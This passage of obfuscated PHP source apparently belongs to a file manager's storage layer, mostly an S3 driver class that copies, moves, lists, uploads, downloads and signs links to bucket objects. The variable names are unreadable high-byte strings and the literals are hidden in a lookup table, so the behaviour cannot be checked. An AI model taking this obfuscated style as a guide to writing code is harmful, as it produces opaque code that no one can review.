Á[195]; } ImageThumb::createThumb($Ş†ˆµ•“, $Æ¬ıàá‡, $ëê¨­øù, $ëê¨­øù * 10); if (@file_exists($Æ¬ıàá‡)) { Cache::remove($Â”Ê¦‡ñ); return IO::move($Æ¬ıàá‡, $Î¡Èïªê); } Cache::set($Â”Ê¦‡ñ, $şÓ« Á[187], 600); del_file($Æ¬ıàá‡); return $şÓ« Á[196] . $Ş†ˆµ•“ . $şÓ« Á[74]; } public function fileOutImageServer($êÁ¸”ïî, $éªá¦×™ = 250) { $this->fileOutImage($êÁ¸”ïî, $éªá¦×™); } public function fileNameAuto($­Ø²ŸÈ, $ÄÑ³Èî, $®ÙİËØ = REPEAT_RENAME, $„ÑŞŞ÷æ = false) { $³à¹§§ú =& $_SERVER[³à¼î¯á]; $‡Ò­ş = $­Ø²ŸÈ === $³à¹§§ú[12] ? $ÄÑ³Èî : rtrim($­Ø²ŸÈ, $³à¹§§ú[8]) . $³à¹§§ú[8] . $ÄÑ³Èî; if ($®ÙİËØ == REPEAT_REPLACE || !$this->exist($‡Ò­ş) || $„ÑŞŞ÷æ && $®ÙİËØ != REPEAT_RENAME_FOLDER) { return $ÄÑ³Èî; } if ($®ÙİËØ == REPEAT_SKIP) { return !1; } $£ÔÇ®¯Ö = $³à¹§§ú[10] . get_path_ext($ÄÑ³Èî); $£ÔÇ®¯Ö = $£ÔÇ®¯Ö == $³à¹§§ú[10] || $„ÑŞŞ÷æ ? $³à¹§§ú[12] : $£ÔÇ®¯Ö; $Á³¶éß” = 1; $âÙàÍÆ” = substr($ÄÑ³Èî, 0, strlen($ÄÑ³Èî) - strlen($£ÔÇ®¯Ö)); $ì×ÙÜãø = $âÙàÍÆ” . "\x28{$Á³¶éß”}\x29{$£ÔÇ®¯Ö}"; while ($this->exist(rtrim($­Ø²ŸÈ, $³à¹§§ú[8]) . $³à¹§§ú[8] . $ì×ÙÜãø)) { $ì×ÙÜãø = $âÙàÍÆ” . "\x28{$Á³¶éß”}\x29{$£ÔÇ®¯Ö}"; $Á³¶éß”++; } return $ì×ÙÜãø; } private function fileNameAutoList($½£¦ˆ­Ë, $èÕ­î‹¦, $àôÕô ¤ = false) { $ªè× ù› =& $_SERVER[³à¼î¯á]; $Ã£¤ = $this->listPath($½£¦ˆ­Ë, !0); $Ã£¤ = array_merge($Ã£¤[$ªè× ù›[85]], $Ã£¤[$ªè× ù›[86]]); $–ŠÔ…¾ª = array_to_keyvalue($Ã£¤, $ªè× ù›[12], $ªè× ù›[32]); $ıÄ²ÓÇ¸ = $ªè× ù›[10] . get_path_ext($èÕ­î‹¦); $ıÄ²ÓÇ¸ = $ıÄ²ÓÇ¸ == $ªè× ù›[10] || $àôÕô ¤ ? $ªè× ù›[12] : $ıÄ²ÓÇ¸; $“¾ôÂ¹Ì = substr($èÕ­î‹¦, 0, strlen($èÕ­î‹¦) - strlen($ıÄ²ÓÇ¸)); $±¹ÅË³ã = $“¾ôÂ¹Ì . "\x28\x30\51{$ıÄ²ÓÇ¸}"; for ($ùÍô„˜Î = 1; $ùÍô„˜Î <= count($–ŠÔ…¾ª) + 1; $ùÍô„˜Î++) { $±¹ÅË³ã = $“¾ôÂ¹Ì . "\x28{$ùÍô„˜Î}\x29{$ıÄ²ÓÇ¸}"; if (!in_array_not_case($±¹ÅË³ã, $–ŠÔ…¾ª)) { return $±¹ÅË³ã; } } return $±¹ÅË³ã; } public function listAllFiles($Şô­Ğ‰‚, $åØïãû) { $ğ…–ğï­ =& $_SERVER[³à¼î¯á]; if (empty($åØïãû)) { return array(); } $Ëâ§™ï = array_keys($åØïãû); $¨¤œœÌ = array(); $Şô­Ğ‰‚ = trim($Şô­Ğ‰‚, $ğ…–ğï­[8]); foreach ($åØïãû as $å•İ³£í => $±úã”™) { $øêõùÊ¨ = ltrim(substr(trim($å•İ³£í, $ğ…–ğï­[8]), strlen($Şô­Ğ‰‚)), $ğ…–ğï­[8]); if (substr($å•İ³£í, -1) == $ğ…–ğï­[8]) { $øêõùÊ¨ = rtrim($øêõùÊ¨, $ğ…–ğï­[8]) . $ğ…–ğï­[8]; } $¨¤œœÌ = array_merge($¨¤œœÌ, $this->slicePath($øêõùÊ¨)); } $º×¢ÛÈ = array(); foreach (array_unique($¨¤œœÌ) as $¿é‚ìŠÒ) { $ò¹’¢ğ = array($ğ…–ğï­[87] => $this->getPathOuter($ğ…–ğï­[8] . $Şô­Ğ‰‚ . $ğ…–ğï­[8] . $¿é‚ìŠÒ), $ğ…–ğï­[78] => 1, $ğ…–ğï­[79] => 0); if (substr($¿é‚ìŠÒ, -1) != $ğ…–ğï­[8]) { $ò¹’¢ğ[$ğ…–ğï­[78]] = 0; $ğÕÑ½µ« = $this->getPath($Şô­Ğ‰‚ . $ğ…–ğï­[8] . $¿é‚ìŠÒ); if (isset($åØïãû[$ğÕÑ½µ«])) { $´ı–…½é = $åØïãû[$ğÕÑ½µ«]; if (isset($´ı–…½é[$ğ…–ğï­[79]])) { $ò¹’¢ğ[$ğ…–ğï­[79]] = intval($´ı–…½é[$ğ…–ğï­[79]]); } if (isset($´ı–…½é[$ğ…–ğï­[197]])) { $ò¹’¢ğ[$ğ…–ğï­[88]] = intval($´ı–…½é[$ğ…–ğï­[197]]); } } } $º×¢ÛÈ[] = $ò¹’¢ğ; } return $º×¢ÛÈ; } public function slicePath($ƒÀµğ‘Â) { $·¸ğ¤Ğ¿ =& $_SERVER[³à¼î¯á]; $¡õ†ğÀĞ = explode($·¸ğ¤Ğ¿[8], trim($ƒÀµğ‘Â, $·¸ğ¤Ğ¿[8])); $ªúªª’¯ = 0; do { ++$ªúªª’¯; $Ï†á…Öè[] = implode($·¸ğ¤Ğ¿[8], array_slice($¡õ†ğÀĞ, 0, $ªúªª’¯)) . $·¸ğ¤Ğ¿[8]; } while ($ªúªª’¯ < count($¡õ†ğÀĞ)); $Ï†á…Öè[count($¡õ†ğÀĞ) - 1] = $ƒÀµğ‘Â; return $Ï†á…Öè; } public function getHost() { $‹œ›İœá =& $_SERVER[³à¼î¯á]; $¢ “ª©ë = parse_url(trim($this->domain, $‹œ›İœá[8])); $ğÜë— = isset($¢ “ª©ë[$‹œ›İœá[198]]) ? $¢ “ª©ë[$‹œ›İœá[198]] : http_type(); $ ”é¯ ı = isset($¢ “ª©ë[$‹œ›İœá[199]]) ? $¢ “ª©ë[$‹œ›İœá[199]] : $¢ “ª©ë[$‹œ›İœá[87]]; if (isset($¢ “ª©ë[$‹œ›İœá[200]])) { $ ”é¯ ı .= $‹œ›İœá[4] . $¢ “ª©ë[$‹œ›İœá[200]]; } return $ğÜë— . $‹œ›İœá[201] . $ ”é¯ ı; } public function pathEncode($¶¥¡€µ) { $òôÚø =& $_SERVER[³à¼î¯á]; return str_replace($òôÚø[202], $òôÚø[8], rawurlencode($¶¥¡€µ)); } public function writeLog($®ÉÖ¾õ… = '', $ÑÉÈÕÓ = false) { $®³Ğ¼ç =& $_SERVER[³à¼î¯á]; $®ªÉ’‘Ÿ = in_array(ACTION, array($®³Ğ¼ç[203], $®³Ğ¼ç[204])); if (!$®ªÉ’‘Ÿ && !GLOBAL_DEBUG) { return; } $°Ú ì´ = $®ÉÖ¾õ…; static $ˆ†öÏ¶ = null; if (!$ˆ†öÏ¶) { $ˆ†öÏ¶ = strtoupper($this->getType()); } $®ÉÖ¾õ… = $ˆ†öÏ¶ . $®³Ğ¼ç[205] . $®ÉÖ¾õ…; if ($ÑÉÈÕÓ) { $”¥‡ï‚ï = error_get_last(); if ($”¥‡ï‚ï) { $®ÉÖ¾õ… = array($®ÉÖ¾õ…, $”¥‡ï‚ï); } } write_log($®ÉÖ¾õ…, $®³Ğ¼ç[206]); if ($®ªÉ’‘Ÿ) { throw new Exception($°Ú ì´); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($±¸•áá˜) { set_timeout(); require_once SDK_DIR . $_SERVER[³à¼î¯á][207]; parent::__construct(); $this->_init($±¸•áá˜); } public function _init($Ä‰ï¨Ö) { $ì§î”¹ =& $_SERVER[³à¼î¯á]; $this->config = $Ä‰ï¨Ö; foreach ($Ä‰ï¨Ö as $´Î¡óè– => $ÖÅÔİ±ï) { if (isset($this->{$´Î¡óè–})) { $this->{$´Î¡óè–} = $ÖÅÔİ±ï; } } $this->endpoint = $Ä‰ï¨Ö[$ì§î”¹[208]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); if (in_array(ACTION, array($ì§î”¹[203], $ì§î”¹[204]))) { $this->client->setExceptions(); } } public function setSignVersion($Û£¤òñĞ = "\166\x34") { $this->signVer = $Û£¤òñĞ; $this->client->setSignatureVersion($Û£¤òñĞ); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $È•à³ø) { return null; } } public function isBucketCors() { $ù¡¹§ÜÛ =& $_SERVER[³à¼î¯á]; $ğıõğ¾ù = $this->getBucketCors(); if (!$ğıõğ¾ù || !is_array($ğıõğ¾ù)) { return !1; } if (!is_array($ğıõğ¾ù[$ù¡¹§ÜÛ[209]])) { $ğıõğ¾ù[$ù¡¹§ÜÛ[209]] = explode($ù¡¹§ÜÛ[50], $ğıõğ¾ù[$ù¡¹§ÜÛ[209]]); } if ($ğıõğ¾ù[$ù¡¹§ÜÛ[210]] != $ù¡¹§ÜÛ[211] || !in_array($ù¡¹§ÜÛ[211], $ğıõğ¾ù[$ù¡¹§ÜÛ[209]])) { return !1; } $Í²âĞ«Ô = array_map($ù¡¹§ÜÛ[212], $ğıõğ¾ù[$ù¡¹§ÜÛ[213]]); if (!is_array($Í²âĞ«Ô)) { $Í²âĞ«Ô = array(); } $ÏÓ©Ú‰Î = array($ù¡¹§ÜÛ[214], $ù¡¹§ÜÛ[215], $ù¡¹§ÜÛ[216], $ù¡¹§ÜÛ[217], $ù¡¹§ÜÛ[218]); $ÌÜşÙğç = array_diff($ÏÓ©Ú‰Î, $Í²âĞ«Ô); return empty($ÌÜşÙğç); } public function getBucketRgn() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($×Öß±¤å, $ÖÖšŸŠ¡ = '', $÷…ƒ°Ô = REPEAT_RENAME) { $Èú©ÖÍœ = $this->setContent($×Öß±¤å, $ÖÖšŸŠ¡); if ($Èú©ÖÍœ !== !1) { return $this->getPathOuter($×Öß±¤å); } return !1; } public function mkdir($ˆÌôî¤, $Şú—òØ“ = REPEAT_SKIP) { $ù¯ÚØËÄ =& $_SERVER[³à¼î¯á]; if (empty($ˆÌôî¤) && $ˆÌôî¤ !== $ù¯ÚØËÄ[219]) { return !1; } if ($Şú—òØ“ && $this->_isFolder($ˆÌôî¤)) { return $this->getPathOuter($ˆÌôî¤); } $‚ôÓôòö = $this->setContent($ˆÌôî¤, $ù¯ÚØËÄ[12], !0); if ($‚ôÓôòö !== !1) { return $this->getPathOuter($ˆÌôî¤); } return !1; } public function copyFile($°×ÉØÌ, $»‰ËÃÕÎ, $‹ëŒÒ¶û = array()) { $Ó¿‡´¶Æ =& $_SERVER[³à¼î¯á]; $ÁŒº°óÅ = $this->objectMeta($°×ÉØÌ); if (!$ÁŒº°óÅ) { return !1; } if ($ÁŒº°óÅ[$Ó¿‡´¶Æ[79]] <= 1024 * 1024 * 200) { $©£Öò€İ = $this->client->copyObject($this->bucket, $°×ÉØÌ, $this->bucket, $»‰ËÃÕÎ, $Ó¿‡´¶Æ[220], $‹ëŒÒ¶û); } else { $©£Öò€İ = $this->client->multiCopyObject($this->bucket, $°×ÉØÌ, $this->bucket, $»‰ËÃÕÎ, $‹ëŒÒ¶û); } $©£Öò€İ = $©£Öò€İ ? $this->getPathOuter($»‰ËÃÕÎ) : !1; return $©£Öò€İ; } public function moveFile($°Á«·Ë†, $Ëİéƒø­) { if ($this->copyFile($°Á«·Ë†, $Ëİéƒø­)) { $this->delFile($°Á«·Ë†); return $this->getPathOuter($Ëİéƒø­); } return !1; } public function delFile($²“›¹±) { return $this->client->deleteObject($this->bucket, $²“›¹±); } public function delFolder($ÙÑè›¶) { $¯­’ªô =& $_SERVER[³à¼î¯á]; if (!$this->exist($ÙÑè›¶)) { return !0; } $this->listItemCache = !1; $˜Ä¸š²¿ = $this->fileList($ÙÑè›¶); $this->listItemCache = !0; $º¥¾’åé = trim($ÙÑè›¶, $¯­’ªô[8]) . $¯­’ªô[8]; if (!empty($ÙÑè›¶) && $ÙÑè›¶ !== $¯­’ªô[219] && !in_array($º¥¾’åé, $˜Ä¸š²¿[$¯­’ªô[85]])) { $˜Ä¸š²¿[$¯­’ªô[85]][] = $º¥¾’åé; } $¬«íŞ¦è = $this->delByBatch($˜Ä¸š²¿[$¯­’ªô[86]]); if (!$¬«íŞ¦è) { return !1; } $¬«íŞ¦è = $this->delByBatch($˜Ä¸š²¿[$¯­’ªô[85]]); if (!$¬«íŞ¦è) { return !1; } return $this->delFile($º¥¾’åé); } private function delByBatch($¢øÇ’Š) { foreach (array_chunk($¢øÇ’Š, 1000) as $ï¥«Å·Á) { $ñÀÄ·½€ = $this->client->deleteObjects($this->bucket, $ï¥«Å·Á); if (!$ñÀÄ·½€) { return !1; } } return !0; } public function rename($‡ê£®ƒ, $™Ä‚€) { return $this->renameObject($‡ê£®ƒ, $™Ä‚€); } public function listPath($ªÑ²–Â£, $è»ìúåÂ = false) { $ºàˆà…­ =& $_SERVER[³à¼î¯á]; $ôÏ¢©¯ = $this->fileList($ªÑ²–Â£, $ºàˆà…­[8], !0); foreach ($ôÏ¢©¯[$ºàˆà…­[85]] as $Œ‰…‘ØÓ => $Ü½œßİ) { $ôÏ¢©¯[$ºàˆà…­[85]][$Œ‰…‘ØÓ] = $this->folderInfo($Ü½œßİ, $è»ìúåÂ, $Ü½œßİ); } foreach ($ôÏ¢©¯[$ºàˆà…­[86]] as $Œ‰…‘ØÓ => $Ü½œßİ) { $ôÏ¢©¯[$ºàˆà…­[86]][$Œ‰…‘ØÓ] = $this->fileInfo($Ü½œßİ[$ºàˆà…­[32]], $è»ìúåÂ, $Ü½œßİ); } return $ôÏ¢©¯; } protected function infoChildren($Ãáó, &$Äì †È©) { $ÄÓ¸©„Û =& $_SERVER[³à¼î¯á]; $ÕæÀ×ß€ = $this->fileList($Ãáó, $ÄÓ¸©„Û[12], !0); $Äì †È©[$ÄÓ¸©„Û[81]] += count($ÕæÀ×ß€[$ÄÓ¸©„Û[85]]); $Äì †È©[$ÄÓ¸©„Û[80]] += count($ÕæÀ×ß€[$ÄÓ¸©„Û[86]]); foreach ($ÕæÀ×ß€[$ÄÓ¸©„Û[86]] as $“¢°­Ô) { if (!$“¢°­Ô || !$“¢°­Ô[$ÄÓ¸©„Û[79]]) { continue; } $Äì †È©[$ÄÓ¸©„Û[79]] += $“¢°­Ô[$ÄÓ¸©„Û[79]]; } } private function fileInfo($©éüÛ­ç, $ˆú×Ë¯ = false, $¦ùØİâı = array()) { $ô±¶ä˜ç =& $_SERVER[³à¼î¯á]; $ê¢ƒºä¢ = array($ô±¶ä˜ç[32] => $this->pathThis($©éüÛ­ç), $ô±¶ä˜ç[87] => $this->getPathOuter($©éüÛ­ç), $ô±¶ä˜ç[33] => $ô±¶ä˜ç[221], $ô±¶ä˜ç[178] => $this->ext($©éüÛ­ç), $ô±¶ä˜ç[79] => isset($¦ùØİâı[$ô±¶ä˜ç[79]]) ? $¦ùØİâı[$ô±¶ä˜ç[79]] : 0); if ($ˆú×Ë¯) { return $ê¢ƒºä¢; } $ê¢ƒºä¢[$ô±¶ä˜ç[222]] = $ê¢ƒºä¢[$ô±¶ä˜ç[88]] = 0; $ê¢ƒºä¢[$ô±¶ä˜ç[223]] = $ê¢ƒºä¢[$ô±¶ä˜ç[224]] = !0; if (empty($¦ùØİâı)) { $¦ùØİâı = $this->objectMeta($©éüÛ­ç); if (!$¦ùØİâı) { return $ê¢ƒºä¢; } } if (isset($¦ùØİâı[$ô±¶ä˜ç[225]]) && $¦ùØİâı[$ô±¶ä˜ç[225]]) { $ê¢ƒºä¢[$ô±¶ä˜ç[226]] = $¦ùØİâı[$ô±¶ä˜ç[225]]; } if (isset($¦ùØİâı[$ô±¶ä˜ç[197]])) { $ê¢ƒºä¢[$ô±¶ä˜ç[88]] = $¦ùØİâı[$ô±¶ä˜ç[197]]; } if (isset($¦ùØİâı[$ô±¶ä˜ç[79]])) { $ê¢ƒºä¢[$ô±¶ä˜ç[79]] = $¦ùØİâı[$ô±¶ä˜ç[79]]; } return $ê¢ƒºä¢; } private function folderInfo($ö¢ÍÙ”¹, $Ÿ°²çÍ = false, $à¨Ë‡ğŒ = array()) { $Õ­õ âÍ =& $_SERVER[³à¼î¯á]; $Ö®‰Úó = array($Õ­õ âÍ[32] => $this->pathThis($ö¢ÍÙ”¹), $Õ­õ âÍ[87] => $this->getPathOuter($Õ­õ âÍ[8] . $ö¢ÍÙ”¹), $Õ­õ âÍ[33] => $Õ­õ âÍ[78]); if ($Ÿ°²çÍ) { return $Ö®‰Úó; } $Ö®‰Úó[$Õ­õ âÍ[222]] = $Ö®‰Úó[$Õ­õ âÍ[88]] = 0; $Ö®‰Úó[$Õ­õ âÍ[223]] = $Ö®‰Úó[$Õ­õ âÍ[224]] = !0; if ($ö¢ÍÙ”¹ == $Õ­õ âÍ[12]) { return $Ö®‰Úó; } if (empty($à¨Ë‡ğŒ)) { $à¨Ë‡ğŒ = $this->objectMeta(trim($ö¢ÍÙ”¹, $Õ­õ âÍ[8]) . $Õ­õ âÍ[8]); } if (isset($à¨Ë‡ğŒ[$Õ­õ âÍ[197]])) { $Ö®‰Úó[$Õ­õ âÍ[222]] = $à¨Ë‡ğŒ[$Õ­õ âÍ[197]]; } return $Ö®‰Úó; } private function fileList($êÛ×±®Ÿ, $¿ÔÓµÕù = '', $É¡’Õ×Ñ = 0) { $¼¹æ…›™ =& $_SERVER[³à¼î¯á]; $Àº¨Ü¦· = rtrim($êÛ×±®Ÿ, $¼¹æ…›™[8]) . $¼¹æ…›™[8]; $™¢æáÕ» = $this->listObjs($Àº¨Ü¦·, null, null, $¿ÔÓµÕù); if (!$™¢æáÕ») { return array($¼¹æ…›™[85] => array(), $¼¹æ…›™[86] => array()); } $ÖÛ©€– = $ªñƒÌå° = array(); foreach ($™¢æáÕ»[$¼¹æ…›™[227]] as $™ÂáÔ) { $ÎçœèÄ = $™ÂáÔ[$¼¹æ…›™[32]]; if ($ÎçœèÄ == $Àº¨Ü¦·) { continue; } $Œ©ë‘Ä = isset($™ÂáÔ[$¼¹æ…›™[79]]) ? $™ÂáÔ[$¼¹æ…›™[79]] : 0; $ÎœÁóğ„ = $Œ©ë‘Ä == 0 && substr($ÎçœèÄ, strlen($ÎçœèÄ) - 1, 1) == $¼¹æ…›™[8] ? !0 : !1; $this->cacheMethodInfoSet($ÎçœèÄ, $ÎœÁóğ„, $™ÂáÔ); if ($ÎœÁóğ„) { $ÖÛ©€–[] = $ÎçœèÄ; continue; } $ªñƒÌå°[] = $É¡’Õ×Ñ ? $™ÂáÔ : $ÎçœèÄ; } foreach ($™¢æáÕ»[$¼¹æ…›™[228]] as $™ÂáÔ) { $ÖÛ©€–[] = $™ÂáÔ[$¼¹æ…›™[32]]; $this->cacheMethodInfoSet($™ÂáÔ[$¼¹æ…›™[32]], !0); } $this->cacheMethodInfoSet($êÛ×±®Ÿ, !0); return array($¼¹æ…›™[85] => $ÖÛ©€–, $¼¹æ…›™[86] => $ªñƒÌå°); } private function listObjs($¤¨à©¿‘, $ÍÎ—Ü„¼ = null, $Ä¼Ãá®Ö = null, $õ±ŞÀĞ’ = null) { $Ú¤ã‘… =& $_SERVER[³à¼î¯á]; $¤¨à©¿‘ = trim($¤¨à©¿‘, $Ú¤ã‘…[8]); $Ù™ÜÅ²ı = empty($¤¨à©¿‘) && $¤¨à©¿‘ !== $Ú¤ã‘…[219] ? $Ú¤ã‘…[12] : $¤¨à©¿‘ . $Ú¤ã‘…[8]; return $this->client->getBucket($this->bucket, $Ù™ÜÅ²ı, $ÍÎ—Ü„¼, $Ä¼Ãá®Ö, $õ±ŞÀĞ’, !0); } public function has($Íñğû˜ , $ğ§¯Äèû = false, $¬¯¶ï¤‹ = true) { $ñğƒØĞï =& $_SERVER[³à¼î¯á]; $Íñğû˜  = trim($Íñğû˜ , $ñğƒØĞï[8]); $ò³àĞ©û = empty($Íñğû˜ ) && $Íñğû˜  !== $ñğƒØĞï[219] ? $ñğƒØĞï[12] : $Íñğû˜  . $ñğƒØĞï[8]; $‘èÆ–³Ò = null; $Ã˜‰€Øè = 500; $î¢­ßÅç = $ñğƒØĞï[8]; $‹€“‰ƒ× = $×ù„âæì = array(); while (!0) { $­ë·‘¢ = $this->listObjs($Íñğû˜ , $‘èÆ–³Ò, $Ã˜‰€Øè, $î¢­ßÅç); if (!$­ë·‘¢) { break; } $‘èÆ–³Ò = $­ë·‘¢[$ñğƒØĞï[229]]; $‘şÌĞä = $­ë·‘¢[$ñğƒØĞï[227]]; $¨÷ƒ = $­ë·‘¢[$ñğƒØĞï[228]]; if (empty($‘şÌĞä) && empty($¨÷ƒ)) { break; } if (count($‘şÌĞä) == 1 && $‘şÌĞä[0][$ñğƒØĞï[32]] == $ò³àĞ©û) { break; } if ($ğ§¯Äèû) { if (count($‘şÌĞä)) { $‘şÌĞä = array_column($‘şÌĞä, $ñğƒØĞï[32]); $‹€“‰ƒ× = array_merge($‹€“‰ƒ×, $‘şÌĞä); } if (count($¨÷ƒ)) { $¨÷ƒ = array_column($¨÷ƒ, $ñğƒØĞï[32]); $×ù„âæì = array_merge($×ù„âæì, $¨÷ƒ); } if ($‘èÆ–³Ò === null) { break; } continue; } if ($¬¯¶ï¤‹) { if (!empty($‘şÌĞä)) { if (count($‘şÌĞä) > 1 || isset($‘şÌĞä[0][$ñğƒØĞï[32]]) && $‘şÌĞä[0][$ñğƒØĞï[32]] != $ò³àĞ©û) { return !0; } } } else { if (!empty($¨÷ƒ)) { return !0; } } if ($‘èÆ–³Ò === null) { break; } } if ($ğ§¯Äèû) { $‹€“‰ƒ× = array_diff($‹€“‰ƒ×, array($ò³àĞ©û)); $‹€“‰ƒ× = count(array_unique($‹€“‰ƒ×)); $×ù„âæì = count(array_unique($×ù„âæì)); return array($ñğƒØĞï[230] => $‹€“‰ƒ×, $ñğƒØĞï[231] => $×ù„âæì); } return !1; } public function listAll($¬ë…şÏ£) { $ù¶õ“Âé =& $_SERVER[³à¼î¯á]; $¨´›„à‚ = $this->fileList($¬ë…şÏ£, $ù¶õ“Âé[12], !0); $´ÊÈ¾İÂ = array_to_keyvalue($¨´›„à‚[$ù¶õ“Âé[86]], $ù¶õ“Âé[32]); foreach ($¨´›„à‚[$ù¶õ“Âé[85]] as $ä‚ì‹İí) { if (is_string($ä‚ì‹İí)) { $´ÊÈ¾İÂ[$ä‚ì‹İí] = array($ù¶õ“Âé[79] => 0); } } return $this->listAllFiles($¬ë…şÏ£, $´ÊÈ¾İÂ); } public function canRead($¦°¶Ìæ) { $ËÕå×´Ü =& $_SERVER[³à¼î¯á]; $û‹ÛŞ = $this->client->getAccessControlPolicy($this->bucket, $¦°¶Ìæ); if (!$û‹ÛŞ) { return !1; } return in_array($û‹ÛŞ, array($ËÕå×´Ü[232], $ËÕå×´Ü[233], $ËÕå×´Ü[234])) ? !0 : !1; } public function canWrite($ÌµÁ÷èì) { $Îè‰üØ =& $_SERVER[³à¼î¯á]; $ ¹¡Å ‰ = $this->client->getAccessControlPolicy($this->bucket, $ÌµÁ÷èì); if (!$ ¹¡Å ‰) { return !1; } return in_array($ ¹¡Å ‰, array($Îè‰üØ[232], $Îè‰üØ[233])) ? !0 : !1; } public function getContent($¶Ú×€«†) { return $this->client->getObject($this->bucket, $¶Ú×€«†); } public function setContent($‰‚ì¶×œ, $İÉ¬Œ¶¥ = '', $›Ò¿‰ç³ = false) { $º°ê¶å =& $_SERVER[³à¼î¯á]; $‰‚ì¶×œ = $›Ò¿‰ç³ ? trim($‰‚ì¶×œ, $º°ê¶å[8]) . $º°ê¶å[8] : $‰‚ì¶×œ; $•é¼¿ãå = get_file_mime(get_path_ext($‰‚ì¶×œ)); $¸É¡Ëí½ = $this->client->putObject($İÉ¬Œ¶¥, $this->bucket, $‰‚ì¶×œ, $º°ê¶å[220], array(), $•é¼¿ãå); if (!$¸É¡Ëí½) { return !1; } if ($›Ò¿‰ç³) { return !0; } return $¸É¡Ëí½ ? !0 : !1; } public function fileSubstr($í£ÚËÜÃ, $áÜ™·şˆ, $äÄ‰Üü×) { $œùî±†ó = $áÜ™·şˆ + $äÄ‰Üü× - 1; return $this->client->getObject($this->bucket, $í£ÚËÜÃ, array($_SERVER[³à¼î¯á][235] => "\x62\171\x74\x65\163\75{$áÜ™·şˆ}\x2d{$œùî±†ó}")); } public function upload($ûÑÌ¥ğ, $ˆÕ¯¤Ş, $’··‚ˆÅ = false, $ı€ò˜Õù = REPEAT_REPLACE) { $×Ìø–î„ =& $_SERVER[³à¼î¯á]; $š¼îÍÇú = array($×Ìø–î„[236] => @md5_file($ˆÕ¯¤Ş)); $ê¯˜ÊØ = array($×Ìø–î„[237] => get_file_mime(get_path_ext($ûÑÌ¥ğ))); if (IO::size($ˆÕ¯¤Ş) <= 1024 * 1024 * 200) { $îã¯¡Œ£ = $this->client->putObjectFile($ˆÕ¯¤Ş, $this->bucket, $ûÑÌ¥ğ, $×Ìø–î„[220], $š¼îÍÇú, $ê¯˜ÊØ); return !empty($îã¯¡Œ£) ? $this->getPathOuter($ûÑÌ¥ğ) : !1; } $ÚÇá…•¤ = $this->client->multiUploadObject($ˆÕ¯¤Ş, $this->bucket, trim($ûÑÌ¥ğ, $×Ìø–î„[8]), $š¼îÍÇú, $ê¯˜ÊØ); return $ÚÇá…•¤ ? $this->getPathOuter($ûÑÌ¥ğ) : !1; } public function download($ã„°èÒ©, $¥Üá´îê) { if (!@is_dir($this->pathFather($¥Üá´îê)) && !IO::mkdir($this->pathFather($¥Üá´îê))) { return !1; } $ÆÌÇÑ£Û = $this->client->getObject($this->bucket, $ã„°èÒ©, array(), $¥Üá´îê); return $ÆÌÇÑ£Û !== !1 ? $¥Üá´îê : !1; } public function link($Ï¤ííÛ‘, $½»µ‡Ó° = array()) { $ìâĞÌã =& $_SERVER[³à¼î¯á]; if ($this->signVer == $ìâĞÌã[238]) { return $this->client->getAuthenticatedURL($this->bucket, $Ï¤ííÛ‘, 3600 * 12, $½»µ‡Ó°); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($Ï¤ííÛ‘, $ìâĞÌã[8]), 3600 * 12, $this->region, array(), !0, $½»µ‡Ó°); } public function fileOut($è­ÄÒìî, $×©ë˜°ö = false, $¯™ÕıĞš = false, $½«¾ÆĞ = '') { $§éß”“• =& $_SERVER[³à¼î¯á]; if ($this->isFileOutServer()) { return $this->fileOutServer($è­ÄÒìî, $×©ë˜°ö, $¯™ÕıĞš, $½«¾ÆĞ); } if (!$¯™ÕıĞš) { $¯™ÕıĞš = $this->pathThis($è­ÄÒìî); } $‚ó¶Á½­ = get_file_mime(get_path_ext($¯™ÕıĞš)); if ($‚ó¶Á½­ == $§éß”“•[239]) { return parent::fileOut($è­ÄÒìî, $×©ë˜°ö, $¯™ÕıĞš, $½«¾ÆĞ); } $ïíÂ‘îõ = array($§éß”“•[240] => $‚ó¶Á½­); if ($×©ë˜°ö) { $ïíÂ‘îõ[$§éß”“•[241]] = $§éß”“•[242] . rawurlencode($¯™ÕıĞš); } else { } $ş·ƒæìê = $this->link($è­ÄÒìî, $ïíÂ‘îõ); $this->fileOutLink($ş·ƒæìê); } public function fileOutServer($Ş›¶ë¸º, $»ÚÀˆ°Â = false, $¥àÊ®•Ä = false, $¸“Æõê = '') { parent::fileOut($Ş›¶ë¸º, $»ÚÀˆ°Â, $¥àÊ®•Ä, $¸“Æõê); } public function fileOutImageServer($µ¢šÁãı, $Ÿâ“ı‚ƒ = 250) { parent::fileOutImage($µ¢šÁãı, $Ÿâ“ı‚ƒ); } public function hashMd5($”Ç¹¯äÊ, $ÀÑàñŠ´ = '') { $ÔˆÕõø = $this->objectMeta($”Ç¹¯äÊ); if (!$ÔˆÕõø) { return !1; } $ÀÑàñŠ´ = $ÀÑàñŠ´ ? $ÀÑàñŠ´ : _get($ÔˆÕõø, $_SERVER[³à¼î¯á][243]); return $ÀÑàñŠ´; } public function uploadFormData($ßä°ïŒĞ, $ü²ßÃò = 3600) { $€öòçı¤ =& $_SERVER[³à¼î¯á]; $Ò‚ÀĞˆö = $this->pathFather($ßä°ïŒĞ); $É«æˆîĞ = $this->client->getHttpUploadPostParams($this->bucket, $Ò‚ÀĞˆö, $€öòçı¤[220], $ü²ßÃò); return array_merge((array) $É«æˆîĞ, array($€öòçı¤[199] => $this->getHost())); } public function multiUploadFormData($òıÒäµ, $ÎŞ¨›œĞ = 3600) { $ÛĞäõ‚ƒ =& $_SERVER[³à¼î¯á]; $Ş¼œÚÏô = gmdate($ÛĞäõ‚ƒ[244]); $˜ì±±ö¤ = array(); $™¢’œÚ½ = $this->client->getUploadId($this->bucket, $òıÒäµ, $˜ì±±ö¤); if (!$™¢’œÚ½) { return !1; } return array($ÛĞäõ‚ƒ[245] => $™¢’œÚ½, $ÛĞäõ‚ƒ[199] => $this->getHost() . $ÛĞäõ‚ƒ[8] . $this->pathEncode($òıÒäµ), $ÛĞäõ‚ƒ[246] => $Ş¼œÚÏô, 